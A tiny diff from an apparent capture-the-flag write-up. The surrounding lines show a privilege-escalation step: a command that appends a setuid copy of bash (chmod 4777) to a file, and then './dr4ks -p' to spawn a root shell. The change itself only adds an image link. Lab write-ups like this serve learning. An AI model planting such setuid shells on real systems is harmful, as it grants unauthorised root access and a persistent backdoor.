@@ -156,4 +156,6 @@ echo "cp /bin/bash /home/sysadmin/dr4ks && chmod 4777 /home/sysadmin/dr4ks" >> /
 
 Then, we need to run `./dr4ks -p` to get root shell.
 
+![Alt text](img/image-16.png)
+
 
